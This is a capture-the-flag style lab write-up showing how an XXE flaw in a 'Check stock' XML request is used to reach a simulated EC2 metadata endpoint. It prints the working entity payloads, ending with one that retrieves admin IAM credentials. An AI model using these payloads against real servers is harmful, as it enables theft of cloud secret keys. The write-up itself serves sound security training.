# Description
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the vulnerability to perform an that obtains the server's IAM secret access key from the EC2 metadata endpoint.

# Process
To begin, I opened the product page and pressed the "Check stock" button, which I intercepted in Burp Suite. The request body looked like this:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>17</productId>
	<storeId>1</storeId>
</stockCheck>
```
To begin, I inserted a DTD to create an external entity that referenced the given IP address, and added the entity's name inside the first child tag:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE abc [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

This resulted in a simple response, which included this line:
```
"Invalid product ID: latest"
```

This was, presumably, a list of the subdirectories within the external site that I could navigate to. I added that to the DTD:
```
<!DOCTYPE abc [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
```
and received another response:
```
"Invalid product ID: meta-data"
```

I kept following the path until I reached the end. The final DTD was:
```
<!DOCTYPE abc [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```
and it led to the administrator's secret access key and token. This solved the lab.